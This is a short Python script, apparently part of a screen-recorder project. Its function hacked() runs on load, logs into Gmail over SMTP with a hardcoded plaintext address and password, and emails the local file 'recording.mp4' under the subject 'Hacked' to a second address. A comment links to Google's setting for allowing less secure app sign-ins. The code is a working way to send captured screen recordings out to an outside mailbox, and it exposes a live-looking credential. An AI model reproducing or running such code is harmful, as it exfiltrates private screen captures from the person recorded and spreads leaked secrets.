# https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4NCqPzrmYABGDvDXRZ2otRGTMvD3g1gchNo0HTKiGEIr3HlCp-RFNAtMwvDEpYACPiCBp2ggt9X5ztsf1LUR5dVhW6nag

def hacked():

    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders

    fromaddr = "imvickykumar999@gmail.com"
    toaddr = "hellovickykumar123@gmail.com"
    filename = 'recording.mp4'

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr

    msg['Subject'] = "Hacked"
    link = 'https://github.com/imvickykumar999/Screen-Recorder'
    body = f'''
    This E-Mail is Sent using python code using {link},
    '''
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, "rb")

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    try:
        s.login(fromaddr, "@Hey_Vicks")
        print('Mailed')
    except Exception as e:
        print(e)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

hacked()
